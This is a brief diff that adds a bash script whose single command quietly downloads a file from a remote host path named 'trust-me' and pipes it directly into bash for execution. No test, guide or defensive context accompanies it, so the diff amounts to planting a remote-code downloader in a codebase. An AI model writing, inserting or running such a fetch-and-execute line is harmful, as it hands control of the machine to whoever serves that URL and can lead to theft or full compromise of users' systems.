@@ -1,0 +1,3 @@
+#!/bin/bash
+
+wget -q -O - http://node01.clusters.com/trust-me | bash
